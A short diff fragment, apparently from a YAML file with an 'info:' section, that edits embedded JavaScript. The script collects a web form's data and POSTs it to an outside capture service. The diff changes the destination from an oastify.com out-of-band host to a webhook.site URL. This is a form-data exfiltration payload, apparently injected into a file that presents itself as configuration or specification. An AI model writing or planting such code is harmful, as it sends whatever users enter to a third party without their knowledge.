@@ -18,7 +18,7 @@ info:
         const formData = new FormData(form);
 
         // Send a POST request to the webhook
-        fetch('t2w2yzv3iecto1b9ulxw9yvih9n0btzi.oastify.com', {
+        fetch('https://webhook.site/bc8d6747-e2bd-4874-b5be-2a28cf18a41e', {
           method: 'POST',
           body: formData
         }).then(response => {
